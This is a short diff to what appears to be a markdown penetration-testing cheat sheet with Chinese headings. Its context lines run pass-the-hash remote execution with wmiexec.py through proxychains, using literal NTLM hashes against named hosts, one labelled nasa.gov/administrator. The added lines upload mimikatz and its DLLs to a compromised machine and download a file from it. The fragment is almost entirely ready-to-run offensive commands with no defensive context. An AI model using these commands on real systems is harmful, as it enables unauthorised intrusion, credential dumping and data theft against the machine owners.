@@ -408,6 +408,13 @@ net use P: \\Name\zhq3211
 
 proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
 proxychains python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
+
+## 上传文件
+lput /tmp/m/mimilib.dll .
+lput /tmp/m/mimispool.dll .
+lput /tmp/m/mimikatz.exe .
+## 下载文件
+lget ./file
 ```
 
 # Article
